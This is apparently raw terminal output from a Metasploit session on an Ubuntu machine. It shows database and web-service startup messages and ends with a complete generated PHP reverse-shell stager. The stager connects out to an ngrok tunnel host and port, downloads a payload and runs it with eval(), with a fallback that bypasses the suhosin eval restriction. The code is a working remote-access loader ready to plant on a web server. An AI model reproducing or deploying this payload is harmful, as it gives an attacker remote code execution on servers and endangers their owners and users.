Found a database at /home/ubuntu/.msf4/db, checking to see if it is started
Starting database at /home/ubuntu/.msf4/db...[1m[32msuccess[0m[0m
[1m[34m[?][0m[0m Initial MSF web service account username? [ubuntu]: [1m[34m[?][0m[0m Initial MSF web service account password? (Leave blank for random password): 
Generating SSL key and certificate for MSF web service
MSF web service PID file found, but no active process running as PID 1754399
Deleting MSF web service PID file /home/ubuntu/.msf4/msf-ws.pid
Attempting to start MSF web service...[1m[31mfailed[0m[0m
[1m[31m[!][0m[0m MSF web service appears to be started, but may not operate as expected.
MSF web service expects authentication. If you wish to reinitialize the web service account you will need to reinitialize the database.
Please see /home/ubuntu/.msf4/logs/msf-ws.log for additional details.
/*<?php /**/ error_reporting(0); $ip = '0.tcp.ngrok.io'; $port = 19478; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die();